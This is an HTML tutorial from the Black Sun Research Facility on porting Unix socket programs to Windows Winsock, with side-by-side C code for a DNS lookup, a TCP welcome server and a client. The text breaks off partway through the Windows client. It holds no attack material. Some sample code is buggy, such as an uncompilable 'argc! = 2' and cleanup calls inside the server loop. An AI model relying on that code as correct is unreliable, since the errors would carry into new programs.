@@ -1,0 +1,816 @@
+
+<html>
+<head>
+     <title>Windows Internet Programming Part2</title>
+</head>
+<body>
+<pre>
+<font color=red>
+              _________________
+             /_               /\  
+              \/  _______    /  \
+              /  /      /   /   /
+             /  /______/   /   /
+            /           __/   /
+           /  _______   \  __/
+          /  /      /   /  \
+         /  /______/   /   / 
+       _/             /   /      
+      /______________/   /       BLACK SUN RESEARCH FACILITY
+      \              \  /      	   <a href="http://blacksun.box.sk">HTTP://BLACKSUN.BOX.SK</a>
+       \______________\/
+
+
+</font>
+
+
+WINDOWS INTERNET PROGRAMMING {part 2}
+=================================================
+
+
+
+   WRITTEN BY                 [ <a href="mailto:cos125@hotmail.com">cos125@hotmail.com</a>                :E-MAIL    ]      
+           <a href="mailto:cos125@hotmail.com">BINARY RAPE</a>        [ 114603188                         :ICQ#      ]      
+                              [ <a href="http://www.geocities.com/wininetprogram">www.geocities.com/wininetprogram</a>  :WEB SITE  ]
+                              [ <a href="http://blacksun.box.sk">http://blacksun.box.sk</a>            :TURORIALS ]      
+
+
+
+
+
+Thanks to cyberwolf for letting me write this and BSRF for releasing it.
+
+
+
+
+
+<br>
+<p>Disclaimer
+<p>None of the information or code in this tutorial is meant to be used
+against others
+<br>or to purposely damage computer systems and/or cause any loss of or
+damage to property.
+<p>Further more, neither myself or any other contributor to, or member
+of, the Blacksun
+<br>research Facility (BSRF) can be held responsible for damage or loss
+of property to
+<br>computer systems as a result of this tutorial.
+<p>In this tutorial the code is provided as a learning aid so you can see
+how its done
+<br>its not meant for you to use against yourself or others.
+<p>If you don't agree with any of this then please stop reading......&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+now!
+<br>
+<p>CONTENTS
+<br>
+<p>1.&nbsp; <a href="#1">Introduction</a>
+<br>2.&nbsp; <a href="#2">UNIX and Windows</a>
+<br>3.&nbsp; <a href="#3">Error Codes</a>
+<br>4.&nbsp; <a href="#4">Port Numbers</a>
+<br>5.&nbsp; <a href="#5">Include Files</a>
+<br>&nbsp;&nbsp; -<a href="#5.1"> 5.1 socket()</a>
+<br>&nbsp;&nbsp;&nbsp; -<a href="#5.2">5.2 bind()</a>
+<br>&nbsp;&nbsp;&nbsp; -<a href="#5.3">5.3 connect()</a>
+<br>&nbsp;&nbsp;&nbsp; -<a href="#5.4">5.4 listen()</a>
+<br>&nbsp;&nbsp;&nbsp; -<a href="#5.5">5.5 accept()</a>
+<br>&nbsp;&nbsp;&nbsp; -<a href="#5.6">5.6 gethostname()</a>
+<p>6.&nbsp; <a href="#6">Common Functions</a>
+<br>7.&nbsp;<a href="#7"> Renamed Functions</a>
+<br>8.&nbsp; <a href="#8">Blocking Routines</a>
+<br>9.&nbsp; <a href="#9">Additional Functions</a>
+<br>10. <a href="#10">Porting Code</a>
+<br>&nbsp;&nbsp;&nbsp; -10.1 <a href="#10.1">DNS Program</a>
+<br>&nbsp;&nbsp;&nbsp; -10.2 <a href="#10.2">Streaming Server</a>
+<br>&nbsp;&nbsp;&nbsp; -10.3 Streaming Client
+<p>11. <a href="#11">Planning</a>
+<br>12. <a href="#12">Last Words</a>
+<p>&nbsp;&nbsp;&nbsp; APPENDIXES
+<p>&nbsp;&nbsp;&nbsp; A - <a href="#appxA">The Compiler</a>
+<p>______________________
+<br>1.0<a NAME="1"></a> INTRODUCTION
+<br>&nbsp;
+<p>In the last part in this series of tutorials I discussed windows sockets
+programming using
+<br>the winsock API and in that document I mentioned that the windows Sockets
+implementation is
+<br>based on the Berkeley Sockets idea, therefore socket programming on
+systems such as UNIX
+<br>and Linux, which are also based on the Berkeley API would be quiet
+similar. This aids us
+<br>in porting from platform to platform, making it easy to move whole
+programs from UNIX to
+<br>windows in a very short time.
+<p>This tutorial will discuss and illustrate the differences in code and
+functions between the
+<br>platforms and sample source code and applications will be provided
+to show how to port the
+<br>applications piece by piece.
+<p>I suggest that you first read Part 1 in this series of tutorials and
+also Bracaman's basic
+<br>UNIX sockets tutorial, also available from blacksun.box.sk and also
+from code.box.sk.
+<p>Any add on information for this tutorial and updates are available as
+usual from:
+<br>http://www.geocities.com/winnetprogram.
+<br>&nbsp;
+<p>
+<hr SIZE=1 WIDTH="70%">
+<br>&nbsp;
+<p>2.0&nbsp;<a NAME="2"></a>UNIX AND WINDOWS
+<br>=====================
+<p>Unix and Windows handle sockets differently, UNIX treats sockets the
+same as a file handle
+<br>which is a small integer while in windows it is an unsigned type called
+SOCKET.
+<p>So from the start UNIX and windows actually think of there respective
+sockets differently.
+<p>To best explain the differences the following is an exert from bracamans
+tutorial and
+<br>describes sockets from the Unix point of view:
+<br>&nbsp;
+<p>"In a very simple way, a socket is a way to talk to other computer.
+<p>To be more precise, it's a way to talk to other computers using standard
+Unix file
+<br>descriptors.
+<p>In Unix, every I/O actions are done by writing or reading to a file
+descriptor. A file
+<br>descriptor is just an integer associated with an open file and it can
+be a network connection,
+<br>a terminal, or something else."
+<br>&nbsp;
+<p>
+<hr SIZE=1 WIDTH="70%">
+<br>&nbsp;
+<p>3.0&nbsp;<a NAME="3"></a>ERROR CODES
+<br>=======================================
+<p>In UNIX error codes are available trough the errno variable. In windows
+we use the function
+<br>WSAGetLastError() to obtain these error codes.
+<br>&nbsp;
+<p>_________________________
+<p>4.0&nbsp;<a NAME="4"></a>PORT NUMBERS
+<br>=======================================
+<p>In both Unix and Windows you define the port numbers by entering the
+destination port number
+<br>as a parameter to the function htons(), however in winsock.h several
+port numbers are defined
+<br>for common ports so that you can also use these.
+<p>The following is a list of the default names and there relative port
+numbers:
+<br>
+<pre>
+
+1.  IPPORT_ECHO             -  7
+2.  IPPORT_DISCARD          -  9
+3.  IPPORT_SYSTAT           -  11
+4.  IPPORT_DAYTIME          -  13
+5.  IPPORT_NETSTAT          -  15
+6.  IPPORT_FTP              -  21
+7.  IPPORT_TELNET           -  23
+8.  IPPORT_SMTP             -  25
+9.  IPPORT_TIMESERVER       -  37
+10. IPPORT_NAMESERVER       -  42
+11. IPPORT_WHOIS            -  43
+12. IPPORT_MTP              -  57
+</pre>
+<p>
+<hr SIZE=1 WIDTH="70%">
+<br>&nbsp;
+<p>5.0&nbsp;<a NAME="5"></a>INCLUDE FILES
+<br>=======================================
+<p>In UNIX there are a number of include files to use in socket programming,
+following is a
+<br>list of these functions and related #include files:
+<br>&nbsp;
+<p>5.1&nbsp;<a NAME="5.1"></a>socket()
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ #include &lt;sys/types.h>&nbsp; ]
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ #include &lt;sys/socket.h> ]
+<br>&nbsp;
+<p>5.2&nbsp;<a NAME="5.2"></a>bind()
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ #include &lt;sys/types.h>&nbsp; ]
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ #include &lt;sys/socket.h> ]
+<br>&nbsp;
+<p>5.3&nbsp;<a NAME="5.3"></a>connect()
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ #include &lt;sys/types.h>&nbsp; ]
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ #include &lt;sys/socket.h> ]
+<br>&nbsp;
+<p>5.4&nbsp;<a NAME="5.4"></a>listen()
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ #include &lt;sys/types.h>&nbsp; ]
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ #include &lt;sys/socket.h> ]
+<br>&nbsp;
+<p>5.5&nbsp;<a NAME="5.5"></a>accept()
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ #include &lt;sys/socket.h> ]
+<p>5.6&nbsp;<a NAME="5.6"></a>gethostname()
+<p>&nbsp; [ #include &lt;netdb.h>&nbsp;&nbsp; ]
+<br>&nbsp;
+<br>&nbsp;
+<p>You will need some general socket include files also in UNIX programming:
+<p>#include &lt;netinet/in.h>
+<br>#include &lt;arpa/inet.h>
+<br>&nbsp;
+<p>Your average list of include files at the top of a UNIX socket program
+would therefore
+<br>look something like the following:
+<p>#include &lt;sys/types.h>
+<br>#include &lt;sys/socket.h>
+<br>#include &lt;netdb.h>
+<br>#include &lt;netinet/in.h>
+<br>#include &lt;arpa/inet.h>
+<br>&nbsp;
+<p>In windows the header file for socket and internet programming is contained
+in windows.h,
+<br>therefore the top of a windows socket programming would look like this:
+<p>#include &lt;windows.h>
+<p>The name of the header file for windows socket programming is winsock.h
+and including
+<br>this file in your project as well wont cause any errors of course but
+there’s just no need.
+<p>Windows programs also need to be linked to the file Wsock32.lib before
+they can be
+<br>compiled.
+<p>Consult your compilers documents for further information on this or
+proceed to Appendix 1
+<br>- The compiler.
+<p>
+<hr SIZE=1 WIDTH="70%">
+<br>
+<p>6.0<a NAME="6"></a>COMMON FUNCTIONS
+<br>=======================================
+<p>Both Unix and Windows sockets have a set of functions common to both
+platforms. These are
+<br>mostly the functions dealing with TCP and UDP and all conversion functions
+and structures
+<br>are the same for both platforms.
+<p>For example htons() and inet_addr() are the same on both platforms,
+also so is the
+<br>structures sockaddr and sockaddr_in.
+<br>&nbsp;
+<p>Here is a list of common functions.
+<p>1.&nbsp; Socket()
+<p>2.&nbsp; Bind()
+<p>3.&nbsp; Listen()
+<p>4.&nbsp; Connect()
+<p>5.&nbsp; Accept()
+<p>6.&nbsp; Send()
+<p>7.&nbsp; Recv()
+<p>8.&nbsp; Sendto()
+<p>9.&nbsp; Recvfrom()
+<p>10. Gethostname()
+<br>&nbsp;
+<p>
+<hr SIZE=1 WIDTH="70%">
+<br>&nbsp;
+<p>7.0<a NAME="7"></a> RENAMED FUNCTIONS
+<br>=======================================
+<p>There are some functions which exist in both windows and UNIX socket
+programming but
+<br>during the conversion the names have changed slightly.
+<p>The following table contains a comparison of renamed functions in windows
+and UNIX.<br>
+<pre>
+
+	+===============+==================+
+	| Unix Function | Windows Function |
+	+===============+==================+
+	|    close()    |   closesocket()  |
+	+---------------+------------------+
+	|    ioctl()    |   ioctlsocket()  |
+	+---------------+------------------+
+	|     read()    |      recv()      |
+	+---------------+------------------+
+	|    write()    |      send()      |
+	+---------------+------------------+
+</pre>
+<p>&nbsp;FIG 1. - Comparison of Windows and Unix Socket functions.
+<br>&nbsp;
+<p>
+<hr SIZE=1 WIDTH="70%">
+<br>&nbsp;
+<p>8.0<a NAME="8"></a> BLOCKING ROUTINES
+<br>=======================================
+<p>In windows you can use blocking routines but they are not recommended.
+In windows 3.1
+<br>using the event driven paradigm it is possible to have a blocked operation
+disturbed
+<br>by other event driven activity.
+<p>Soon you will not be able to have blocking routines in Winsock applications
+so it is
+<br>not recommended you use them at all in this scenario as this would
+limit distribution
+<br>possibilities.
+<br>&nbsp;
+<p>
+<hr SIZE=1 WIDTH="70%">
+<br>&nbsp;
+<p>9.0&nbsp;<a NAME="9"></a>ADDITIONAL FUNCTIONS
+<br>=======================================
+<p>In windows there are some functions which aren't seen in UNIX sockets.
+In every
+<br>windows socket program you must call WSAStarup() before you can call
+any socket
+<br>functions or use any code.
+<p>Additionally every WSAStartup() function has a corresponding WSACleanup()
+which
+<br>shuts down the Winsock and cleans up after us.
+<p>Every Windows socket program must contain both of these functions.
+<br>&nbsp;
+<p>
+<hr SIZE=1 WIDTH="70%">
+<br>&nbsp;
+<p>10.0&nbsp;<a NAME="10"></a>PORTING CODE
+<br>=======================================
+<p>Now that we have discussed the different parts of the program in Unix
+and its relevant
+<br>Windows parts we can look at some real code.
+<br>&nbsp;
+<br>&nbsp;
+<p>[ 10.1 ]<a NAME="10.1"></a> DNS PROGRAM
+<p>The first program we come across is Bracamans DNS application. Here’s
+the Unix Code.
+<p>/* &lt;---- SOURCE CODE STARTS HERE ----> */
+<p>#include &lt;stdio.h>
+<br>#include &lt;netdb.h>&nbsp;&nbsp; /* This is the header file needed
+for gethostbyname() */
+<br>#include &lt;sys/types.h>
+<br>#include &lt;sys/socket.h>
+<br>#include &lt;netinet/in.h>
+<br>&nbsp;
+<p>int main(int argc, char *argv[])
+<br>{
+<br>&nbsp; struct hostent *he;
+<p>&nbsp; if (argc!=2){
+<br>&nbsp;&nbsp;&nbsp;&nbsp; printf("Usage: %s &lt;hostname>\n",argv[0]);
+<br>&nbsp;&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; if ((he=gethostbyname(argv[1]))==NULL){
+<br>&nbsp;&nbsp;&nbsp;&nbsp; printf("gethostbyname() error\n");
+<br>&nbsp;&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; printf("Hostname : %s\n",he->h_name);&nbsp; /* prints the hostname
+*/
+<br>&nbsp; printf("IP Address: %s\n",inet_ntoa(*((struct in_addr *)he->h_addr)));
+/* prints IP address */
+<br>}
+<br>/* &lt;---- SOURCE CODE ENDS HERE ----> */
+<br>&nbsp;
+<br>&nbsp;
+<p>This is a very small but still a very useful program. If we attempt
+to compile this
+<br>right away under Microsoft Visual C++ We will get an error saying that
+it can not
+<br>find an include file, so our first duty is to remove all of the Unix
+Socket include
+<br>files and replace them with the line:
+<p>#include &lt;windows.h>
+<p>remembering to leave stdio.h right where it is.
+<br>When I tried compiling it now I got several more errors so I changed
+the
+<br>main() fuction from what it is above to:
+<p>void main(int argc, char **argv) and the program then compiled.
+<p>However I then got several linker errors. Remember when socket programming
+on windows
+<br>you must link to the file Wsock32.lib.
+<p>After I linked to the proper .lib file the program compiles perfectly,
+without the
+<br>need to touch a single line of the socket code!!
+<p>This is how compatible different platforms can be with socket code,
+however this is a
+<br>very small program and this is not usually the case. The following
+is the windows
+<br>source code for the port of Bracamans DNS program.
+<p>Remember you will get an error unless you include WSAStartup() and WSACleanup()!!
+<br>&nbsp;
+<p>/* &lt;---- SOURCE CODE STARTS HERE ----> */
+<p>#include &lt;windows.h>
+<br>#include &lt;stdio.h>
+<p>int main(int argc, char *argv[])
+<br>{
+<p>&nbsp; WSADATA&nbsp; wsdata;
+<p>&nbsp; WSAStartup(0x0101,&amp;wsdata);
+<p>&nbsp; struct hostent *he;
+<p>&nbsp; if (argc! = 2)
+<br>&nbsp; {
+<br>&nbsp;&nbsp;&nbsp;&nbsp; printf("Usage: %s hostname\n",argv[0]);
+<br>&nbsp;&nbsp;&nbsp;&nbsp; return -1;
+<br>&nbsp; }
+<p>&nbsp; if ((he = gethostbyname(argv[1])) == NULL)
+<br>&nbsp; {
+<br>&nbsp;&nbsp;&nbsp;&nbsp; printf("gethostbyname() error\n");
+<br>&nbsp;&nbsp;&nbsp;&nbsp; return -1;
+<br>&nbsp; }
+<p>&nbsp; printf("Hostname : %s\n",he->h_name);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* prints the hostname */
+<br>&nbsp; printf("IP Address: %s\n",inet_ntoa(*((struct in_addr *)he->h_addr)));&nbsp;
+/* prints IP address */
+<p>&nbsp; WSACleanup();
+<br>&nbsp; return -1;
+<p>}
+<br>/* &lt;---- SOURCE CODE ENDS HERE ----> */
+<br>&nbsp;
+<p>This program has almost as few lines as the UNIX alternative and requires
+practically
+<br>no porting at all!
+<p>Like I said you wouldn’t usually have a program that runs on windows
+with such little altering.
+<br>Lets discuss porting Bracamans TCP streaming server.
+<br>&nbsp;
+<p>[ 10.2 ]&nbsp;<a NAME="10.2"></a>STREAMING SERVER
+<br>&nbsp;
+<p>/* &lt;---- SOURCE CODE STARTS HERE ----> */
+<p>#include &lt;stdio.h>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* These are the usual header files */
+<br>#include &lt;sys/types.h>
+<br>#include &lt;sys/socket.h>
+<br>#include &lt;netinet/in.h>
+<br>&nbsp;
+<p>#define PORT 3550&nbsp;&nbsp; /* Port that will be opened */
+<br>#define BACKLOG 2&nbsp;&nbsp; /* Number of allowed connections */
+<p>main()
+<br>{
+<br>&nbsp;
+<br>&nbsp; int fd, fd2; /* file descriptors */
+<p>&nbsp; struct sockaddr_in server; /* server's address information */
+<br>&nbsp; struct sockaddr_in client; /* client's address information */
+<p>&nbsp; int sin_size;
+<br>&nbsp;
+<p>&nbsp; if ((fd=socket(AF_INET, SOCK_STREAM, 0)) == -1 ){&nbsp; /* calls
+socket() */
+<br>&nbsp;&nbsp;&nbsp; printf("socket() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; server.sin_family = AF_INET;
+<br>&nbsp; server.sin_port = htons(PORT);&nbsp;&nbsp; /* Remember htons()
+from "Conversions" section? =) */
+<br>&nbsp; server.sin_addr.s_addr = INADDR_ANY;&nbsp; /* INADDR_ANY puts
+your IP address automatically */
+<br>&nbsp; bzero(&amp;(server.sin_zero),8); /* zero the rest of the structure
+*/
+<p>&nbsp;
+<br>&nbsp; if(bind(fd,(struct sockaddr*)&amp;server,sizeof(struct sockaddr))==-1){
+/* calls bind() */
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("bind() error\n");
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; if(listen(fd,BACKLOG) == -1){&nbsp; /* calls listen() */
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("listen() error\n");
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>while(1){
+<br>&nbsp; sin_size=sizeof(struct sockaddr_in);
+<br>&nbsp; if ((fd2 = accept(fd,(struct sockaddr *)&amp;client,&amp;sin_size))==-1){
+/* calls accept() */
+<br>&nbsp;&nbsp;&nbsp; printf("accept() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<br>&nbsp;
+<br>&nbsp; printf("You got a connection from %s\n",inet_ntoa(client.sin_addr)
+); /* prints client's IP */
+<br>&nbsp;
+<br>&nbsp; send(fd2,"Welcome to my server.\n",22,0); /* send to the client
+welcome message */
+<br>&nbsp;
+<br>&nbsp; close(fd2); /*&nbsp; close fd2 */
+<br>}
+<br>}
+<p>/* &lt;---- SOURCE CODE ENDS HERE ----> */
+<br>&nbsp;
+<br>&nbsp;
+<p>Well lets try and compile shall we...
+<br>&nbsp;
+<p>Straight away we should clear the obvious problems, link to Winsock32.lib
+and
+<br>only include windows.h and stdio.h.
+<p>Having done so we receive 2 errors, the first pertains to bzero which
+we do not
+<br>have in our little program so we are going to just remove the line
+that contains
+<br>it. Once we do so we now have only 1 error, woohoo!
+<p>This error tells us that the function close() is not a valid identifier
+which is
+<br>what I said earlier, close() has been replaced by closesocket() in
+windows so we
+<br>change that as well to closesocket().
+<p>We run this program and we recieve a socket error :(. But remember we
+never entered
+<br>WSAStartup() and WSACleanup() in this program so we have to do that
+first and then
+<br>our program will work :).
+<p>If you run the program the command prompt should remain blank, just
+leave the program
+<br>as it is now and move onto the next section to figure out where to
+go from here!!
+<p>First of course here’s the Windows code for the port ;).
+<br>&nbsp;
+<p>/* &lt;---- SOURCE CODE STARTS HERE ----> */
+<p>#include &lt;stdio.h>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* These are the usual header files */
+<br>#include &lt;windows.h>
+<br>&nbsp;
+<p>#define PORT 3550&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
+Port that will be opened */
+<br>#define BACKLOG 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
+Number of allowed connections */
+<p>main()
+<br>{
+<br>&nbsp; WSADATA&nbsp; wsdata;
+<p>&nbsp; WSAStartup(0x0101,&amp;wsdata);
+<p>&nbsp; int fd, fd2;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* file
+descriptors */
+<br>&nbsp;
+<p>&nbsp; struct sockaddr_in server;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* server's
+address information */
+<br>&nbsp; struct sockaddr_in client;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
+client's address information */
+<p>&nbsp; int sin_size;
+<br>&nbsp;
+<p>&nbsp; if ((fd=socket(AF_INET, SOCK_STREAM, 0)) == -1 )&nbsp;&nbsp;&nbsp;
+/* calls socket() */
+<br>&nbsp; {
+<br>&nbsp;&nbsp;&nbsp; printf("socket() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; server.sin_family&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = AF_INET;
+<br>&nbsp; server.sin_port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= htons(PORT);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Remember htons() from "Conversions"
+section? =) */
+<br>&nbsp; server.sin_addr.s_addr&nbsp; = INADDR_ANY;&nbsp;&nbsp;&nbsp;&nbsp;
+/* INADDR_ANY puts your IP address automatically */
+<p>&nbsp;
+<br>&nbsp; if(bind(fd,(struct sockaddr*)&amp;server,sizeof(struct sockaddr))==-1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* calls bind() */
+<br>&nbsp; {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("bind() error\n");
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<br>&nbsp;
+<p>&nbsp; if(listen(fd,BACKLOG) == -1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
+calls listen() */
+<br>&nbsp; {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("listen() error\n");
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<br>&nbsp;
+<p>while(1)
+<br>&nbsp; {
+<br>&nbsp; sin_size=sizeof(struct sockaddr_in);
+<p>&nbsp; if ((fd2 = accept(fd,(struct sockaddr *)&amp;client,&amp;sin_size))
+== -1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* calls accept()
+*/
+<br>&nbsp; {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("accept() error\n");
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<br>&nbsp;
+<br>&nbsp; printf("You got a connection from %s\n",inet_ntoa(client.sin_addr)
+);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* prints client's IP */
+<br>&nbsp;
+<br>&nbsp; send(fd2,"Welcome to my server.\n",22,0);&nbsp;&nbsp;&nbsp;
+/* send to the client welcome message */
+<br>&nbsp;
+<br>&nbsp; closesocket(fd2);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*&nbsp;
+close fd2 */
+<p>&nbsp;
+<br>&nbsp;&nbsp; WSACleanup();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;
+<br>}
+<br>}
+<p>/* &lt;---- SOURCE CODE ENDS HERE ----> */
+<br>&nbsp;
+<br>&nbsp;
+<p>[ 10.3 ] STREAMING CLIENT
+<br>&nbsp;
+<br>&nbsp;
+<p>/* &lt;---- SOURCE CODE STARTS HERE ----> */
+<p>#include &lt;stdio.h>
+<br>#include &lt;sys/types.h>
+<br>#include &lt;sys/socket.h>
+<br>#include &lt;netinet/in.h>
+<br>#include &lt;netdb.h>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
+netbd.h is needed for struct hostent =) */
+<p>#define PORT 3550&nbsp;&nbsp; /* Open Port on Remote Host */
+<br>#define MAXDATASIZE 100&nbsp;&nbsp; /* Max number of bytes of data
+*/
+<p>int main(int argc, char *argv[])
+<br>{
+<br>&nbsp; int fd, numbytes;&nbsp;&nbsp; /* files descriptors */
+<br>&nbsp; char buf[MAXDATASIZE];&nbsp; /* buf will store received text
+*/
+<br>&nbsp;
+<br>&nbsp; struct hostent *he;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* structure that will get information about remote host */
+<br>&nbsp; struct sockaddr_in server;&nbsp; /* server's address information
+*/
+<p>&nbsp; if (argc !=2) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* this is
+used because our program will need one argument (IP) */
+<br>&nbsp;&nbsp;&nbsp; printf("Usage: %s &lt;IP Address>\n",argv[0]);
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; if ((he=gethostbyname(argv[1]))==NULL){ /* calls gethostbyname()
+*/
+<br>&nbsp;&nbsp;&nbsp; printf("gethostbyname() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; if ((fd=socket(AF_INET, SOCK_STREAM, 0))==-1){&nbsp; /* calls
+socket() */
+<br>&nbsp;&nbsp;&nbsp; printf("socket() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; server.sin_family = AF_INET;
+<br>&nbsp; server.sin_port = htons(PORT); /* htons() is needed again */
+<br>&nbsp; server.sin_addr = *((struct in_addr *)he->h_addr);&nbsp; /*he->h_addr
+passes "*he"'s info to "h_addr" */
+<br>&nbsp; bzero(&amp;(server.sin_zero),8);
+<p>&nbsp; if(connect(fd, (struct sockaddr *)&amp;server,sizeof(struct sockaddr))==-1){
+/* calls connect() */
+<br>&nbsp;&nbsp;&nbsp; printf("connect() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; if ((numbytes=recv(fd,buf,MAXDATASIZE,0)) == -1){&nbsp; /* calls
+recv() */
+<br>&nbsp;&nbsp;&nbsp; printf("recv() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buf[numbytes]='\0';
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Server Message: %s\n",buf); /*
+it prints server's welcome message =) */
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fd);&nbsp;&nbsp; /* close fd =)
+*/
+<br>}
+<p>/* &lt;---- SOURCE CODE ENDS HERE ----> */
+<br>&nbsp;
+<p>That’s the source code for the Unix client and of course the windows
+one doesn't
+<br>look very different.
+<br>&nbsp;
+<p>/* &lt;---- SOURCE CODE STARTS HERE ----> */
+<p>#include &lt;windows.h>
+<br>#include &lt;stdio.h>
+<p>#define PORT 3550&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Open Port on
+Remote Host */
+<br>#define MAXDATASIZE 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Max number
+of bytes of data */
+<p>int main(int argc, char *argv[])
+<br>{
+<br>&nbsp; WSADATA&nbsp; wsdata;
+<p>&nbsp; WSAStartup(0x0101,&amp;wsdata);
+<p>&nbsp; int fd, numbytes;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* files descriptors
+*/
+<br>&nbsp; char buf[MAXDATASIZE];&nbsp;&nbsp;&nbsp;&nbsp; /* buf will store
+received text */
+<br>&nbsp;
+<br>&nbsp; struct hostent *he;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* structure that will get information about remote host */
+<br>&nbsp; struct sockaddr_in server;&nbsp;&nbsp;&nbsp; /* server's address
+information */
+<p>&nbsp; if (argc !=2) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* this is used because our program will need one argument (IP) */
+<br>&nbsp;&nbsp;&nbsp; printf("Usage: %s &lt;IP Address>\n",argv[0]);
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; if ((he=gethostbyname(argv[1])) == NULL){ /* calls gethostbyname()
+*/
+<br>&nbsp;&nbsp;&nbsp; printf("gethostbyname() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; if ((fd=socket(AF_INET, SOCK_STREAM, 0))==-1) /* calls socket()
+*/
+<br>&nbsp; {
+<br>&nbsp;&nbsp;&nbsp; printf("socket() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; server.sin_family&nbsp; = AF_INET;
+<br>&nbsp; server.sin_port&nbsp;&nbsp;&nbsp; = htons(PORT);&nbsp;&nbsp;&nbsp;&nbsp;
+/* htons() is needed again */
+<br>&nbsp; server.sin_addr&nbsp;&nbsp;&nbsp; = *((struct in_addr *)he->h_addr);&nbsp;&nbsp;
+/*he->h_addr passes "*he"'s info to "h_addr" */
+<br>&nbsp;
+<p>&nbsp; if(connect(fd, (struct sockaddr *)&amp;server,sizeof(struct sockaddr))==-1)&nbsp;
+/* calls connect() */
+<br>&nbsp; {
+<br>&nbsp;&nbsp;&nbsp; printf("connect() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
+<p>&nbsp; if ((numbytes=recv(fd,buf,MAXDATASIZE,0)) == -1)&nbsp;&nbsp;&nbsp;
+/* calls recv() */
+<br>&nbsp; {
+<br>&nbsp;&nbsp;&nbsp; printf("recv() error\n");
+<br>&nbsp;&nbsp;&nbsp; exit(-1);
+<br>&nbsp; }
